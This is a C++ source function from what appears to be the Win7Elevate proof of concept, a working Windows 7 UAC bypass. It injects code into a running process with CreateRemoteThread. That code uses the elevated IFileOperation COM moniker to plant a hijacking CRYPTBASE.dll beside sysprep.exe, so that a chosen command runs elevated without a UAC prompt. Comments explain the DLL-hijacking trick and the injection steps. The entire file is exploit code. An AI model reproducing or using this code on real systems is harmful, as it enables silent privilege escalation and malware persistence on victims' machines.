void W7EInject::AttemptOperation(HWND hWnd, bool bInject, bool bElevate, DWORD dwPid, const wchar_t *szProcName,
								 const wchar_t *szCmd, const wchar_t *szArgs, const wchar_t *szDir,
								 const wchar_t *szPathToOurDll, 
								 DWORD (__stdcall *Redirector)(void))
{
	bool bThreadWaitSuccess = false;
	bool bThreadWaitFailure = false;
	HANDLE hTargetProc = NULL;

	const BYTE * codeStartAdr = reinterpret_cast< const BYTE * >( &RemoteCodeFunc );
	const BYTE * codeEndAdr   = reinterpret_cast< const BYTE * >( &DummyRemoteCodeFuncEnd );

	if (codeStartAdr >= codeEndAdr)
	{
		//MessageBox(hWnd, L"Unexpected function layout", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Unexpected function layout");
		return;
	}

	wchar_t szPathToSelf[MAX_PATH];

	DWORD dwGMFNRes = GetModuleFileName(NULL, szPathToSelf, _countof(szPathToSelf));

	if (dwGMFNRes == 0 || dwGMFNRes >= _countof(szPathToSelf))
	{
		//MessageBox(hWnd, L"Couldn't get path to self", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Couldn't get path to self");
		return;
	}

	wchar_t szProgramFiles[MAX_PATH];

	HRESULT hr = SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, szProgramFiles);

	if (S_OK != hr)
	{
		//MessageBox(hWnd, L"SHGetFolderPath failed", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"SHGetFolderPath failed");
		return;
	}

	HMODULE hModKernel32 = LoadLibrary(L"kernel32.dll");

	if (hModKernel32 == 0)
	{
		//MessageBox(hWnd, L"Couldn't load kernel32.dll", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Couldn't load kernel32.dll");
		return;
	}	

	W7EUtils::GetProcAddr< BOOL    (WINAPI *)(HMODULE)         > tfpFreeLibrary(         &GetProcAddress, hModKernel32, "FreeLibrary");
	W7EUtils::GetProcAddr< HMODULE (WINAPI *)(LPCWSTR)         > tfpLoadLibrary(         &GetProcAddress, hModKernel32, "LoadLibraryW");
	W7EUtils::GetProcAddr< FARPROC (WINAPI *)(HMODULE, LPCSTR) > tfpGetProcAddress(      &GetProcAddress, hModKernel32, "GetProcAddress");
	W7EUtils::GetProcAddr< BOOL    (WINAPI *)(HANDLE)          > tfpCloseHandle(         &GetProcAddress, hModKernel32, "CloseHandle");
	W7EUtils::GetProcAddr< DWORD   (WINAPI *)(HANDLE,DWORD)    > tfpWaitForSingleObject( &GetProcAddress, hModKernel32, "WaitForSingleObject");

	if (0 == tfpFreeLibrary.f
	||	0 == tfpLoadLibrary.f
	||	0 == tfpGetProcAddress.f
	||	0 == tfpCloseHandle.f
	||	0 == tfpWaitForSingleObject.f)
	{
		//MessageBox(hWnd, L"Couldn't find API", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Couldn't find API");
	}
	else
	{
		// Here we define the target process and DLL for "part 2." This is an auto/silent-elevating process which isn't
		// directly below System32 and which loads a DLL which is directly below System32 but isn't on the OS's "Known DLLs" list.
		// If we copy our own DLL with the same name to the exe's folder then the exe will load our DLL instead of the real one.
		const wchar_t *szElevDir = L"C:\\Windows\\System32\\sysprep";
		const wchar_t *szElevDll = L"CRYPTBASE.dll";
		const wchar_t *szElevDllFull = L"C:\\Windows\\System32\\sysprep\\CRYPTBASE.dll";
		const wchar_t *szElevExeFull = L"C:\\Windows\\System32\\sysprep\\sysprep.exe";
		std::wstring strElevArgs = L"\"";
//		strElevArgs += szElevExeFull;
//		strElevArgs += L"\" \"";
		strElevArgs += szCmd;
		strElevArgs += L"\" \"";
		strElevArgs += szDir;
		strElevArgs += L"\" \"";
		for (const wchar_t *pCmdArgChar = szArgs; *szArgs; ++szArgs)
		{
			if (*szArgs != L'\"')
			{
				strElevArgs += *szArgs;
			}
			else
			{
				strElevArgs += L"\"\"\""; // Turn each quote into three to preserve them in the arguments.
			}
		}
		strElevArgs += L"\"";

		if (!bInject)
		{
			// Test code without remoting.
			// This should result in a UAC prompt, if UAC is on at all and we haven't been launched as admin.

			// Satisfy CreateProcess's non-const args requirement
			wchar_t *szElevArgsNonConst = new wchar_t[strElevArgs.length() + 1];
			wcscpy_s(szElevArgsNonConst, strElevArgs.length() + 1, strElevArgs.c_str());

			InjectArgs ia;
			ia.fpFreeLibrary         = tfpFreeLibrary.f;
			ia.fpLoadLibrary         = tfpLoadLibrary.f;
			ia.fpGetProcAddress      = tfpGetProcAddress.f;
			ia.fpCloseHandle         = tfpCloseHandle.f;
			ia.fpWaitForSingleObject = tfpWaitForSingleObject.f;
			ia.szSourceDll           = szPathToOurDll;
			ia.szElevDir             = szElevDir;
			ia.szElevDll             = szElevDll;
			ia.szElevDllFull         = szElevDllFull;
			ia.szElevExeFull         = szElevExeFull;
			ia.szElevArgs            = szElevArgsNonConst;
			ia.szShell32             = L"shell32.dll";
			ia.szOle32               = L"ole32.dll";
			ia.szCoInitialize        = "CoInitialize";
			ia.szCoUninitialize      = "CoUninitialize";
			ia.szCoGetObject         = "CoGetObject";
			ia.szCoCreateInstance    = "CoCreateInstance";
			ia.szSHCreateItemFPN     = "SHCreateItemFromParsingName";
			ia.szShellExecuteExW     = "ShellExecuteExW";
			ia.szEIFOMoniker         = bElevate ? L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" : NULL;
			ia.pIID_EIFOClass        = bElevate ? NULL : &__uuidof(FileOperation);
			ia.pIID_EIFO             = &__uuidof(IFileOperation);
			ia.pIID_ShellItem2       = &__uuidof(IShellItem2);
			ia.pIID_Unknown          = &__uuidof(IUnknown);

			RemoteCodeFunc(&ia);

			delete[] szElevArgsNonConst;
		}
		else if (W7EUtils::OpenProcessToInject(hWnd, &hTargetProc, dwPid, szProcName))
		{
			// Test code with remoting.
			// At least as of RC1 build 7100, with the default OS settings, this will run the specified command
			// with elevation but without triggering a UAC prompt.

			// Scope CRemoteMemory so it's destroyed before the process handle is closed.
			{
				W7EUtils::CRemoteMemory reme(hTargetProc);

				InjectArgs ia;
				// ASSUMPTION: Remote process has same ASLR setting as us (i.e. ASLR = on)
				//             kernel32.dll is mapped to the same address range in both processes.
				ia.fpFreeLibrary         = tfpFreeLibrary.f;
				ia.fpLoadLibrary         = tfpLoadLibrary.f;
				ia.fpGetProcAddress      = tfpGetProcAddress.f;
				ia.fpCloseHandle         = tfpCloseHandle.f;
				ia.fpWaitForSingleObject = tfpWaitForSingleObject.f;

				// It would be more efficient to allocate and copy the data in one
				// block but since this is just a proof-of-concept I don't bother.

				ia.szSourceDll           = reme.AllocAndCopyMemory(szPathToOurDll);
				ia.szElevDir             = reme.AllocAndCopyMemory(szElevDir);
				ia.szElevDll             = reme.AllocAndCopyMemory(szElevDll);
				ia.szElevDllFull         = reme.AllocAndCopyMemory(szElevDllFull);
				ia.szElevExeFull         = reme.AllocAndCopyMemory(szElevExeFull);
				ia.szElevArgs            = reme.AllocAndCopyMemory(strElevArgs.c_str(), false); // Leave this page writeable for CreateProcess.
									 
				ia.szShell32             = reme.AllocAndCopyMemory(L"shell32.dll");
				ia.szOle32               = reme.AllocAndCopyMemory(L"ole32.dll");
				ia.szCoInitialize        = reme.AllocAndCopyMemory("CoInitialize");
				ia.szCoUninitialize      = reme.AllocAndCopyMemory("CoUninitialize");
				ia.szCoGetObject         = reme.AllocAndCopyMemory("CoGetObject");
				ia.szCoCreateInstance    = reme.AllocAndCopyMemory("CoCreateInstance");
				ia.szSHCreateItemFPN     = reme.AllocAndCopyMemory("SHCreateItemFromParsingName");
				ia.szShellExecuteExW     = reme.AllocAndCopyMemory("ShellExecuteExW");
				ia.szEIFOMoniker         = bElevate ? reme.AllocAndCopyMemory(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}") : NULL;
				ia.pIID_EIFOClass        = bElevate ? NULL : reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(FileOperation), sizeof(__uuidof(FileOperation)), false) );
				ia.pIID_EIFO             = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IFileOperation), sizeof(__uuidof(IFileOperation)), false) );
				ia.pIID_ShellItem2       = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IShellItem2),    sizeof(__uuidof(IShellItem2)),    false) );
				ia.pIID_Unknown          = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IUnknown),       sizeof(__uuidof(IUnknown)),       false) );

				void *pRemoteArgs = reme.AllocAndCopyMemory(&ia, sizeof(ia), false);

				void *pRemoteFunc = reme.AllocAndCopyMemory( RemoteCodeFunc, codeEndAdr - codeStartAdr, true);

				if (reme.AnyFailures())
				{
					//MessageBox(hWnd, L"Remote allocation failed", L"Win7Elevate", MB_OK | MB_ICONWARNING);
					CLogger::LogLine(L"Remote allocation failed");
				}
				else
				{
					HANDLE hRemoteThread = CreateRemoteThread(hTargetProc, NULL, 0, reinterpret_cast< LPTHREAD_START_ROUTINE >( pRemoteFunc ), pRemoteArgs, 0, NULL);

					if (hRemoteThread == 0)
					{
						//MessageBox(hWnd, L"Couldn't create remote thread", L"Win7Elevate", MB_OK | MB_ICONWARNING);
						CLogger::LogLine(
							CError::Format( 
								GetLastError(),
								L"Couldn't create remote thread", 
								L"CreateRemoteThread"));

					}
					else
					{
						if ( Redirector )
							Redirector();

						while(true)
						{
							DWORD dwWaitRes = WaitForSingleObject(hRemoteThread, 10000);

							if (dwWaitRes == WAIT_OBJECT_0)
							{
								bThreadWaitSuccess = true;
								break;
							}
							else if (dwWaitRes != WAIT_TIMEOUT)
							{
								bThreadWaitFailure = true;
								break;
							}
							//else if (IDCANCEL == MessageBox(hWnd, L"Continue waiting for remote thread to complete?", L"Win7Elevate", MB_OKCANCEL | MB_ICONQUESTION))
							else
							{
								CLogger::LogLine(L"Continue waiting for remote thread to complete? : NO");
								// See if it completed before the user asked to stop waiting.
								// Code that wasn't just a proof-of-concept would use a worker thread that could cancel the wait UI.
								if (WAIT_OBJECT_0 == WaitForSingleObject(hRemoteThread, 0))
								{
									bThreadWaitSuccess = true;
								}
								break;
							}
						}

						if (!bThreadWaitSuccess)
						{
							// The memory in the other process could still be in use.
							// Freeing it now will almost certainly crash the other process.
							// Letting it leak is the lesser of two evils...
							reme.LeakMemory();
						}
					}
				}
			}
			CloseHandle(hTargetProc);
		}
	}

	FreeLibrary(hModKernel32);

	if (bThreadWaitFailure)
	{
		//MessageBox(hWnd, L"Error waiting on the remote thread to complete", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Error waiting on the remote thread to complete");
	}
	else if (bThreadWaitSuccess)
	{
		//MessageBox(hWnd, L"Remote thread completed", L"Win7Elevate", MB_OK | MB_ICONINFORMATION);
		CLogger::LogLine(L"Remote thread completed");
	}
}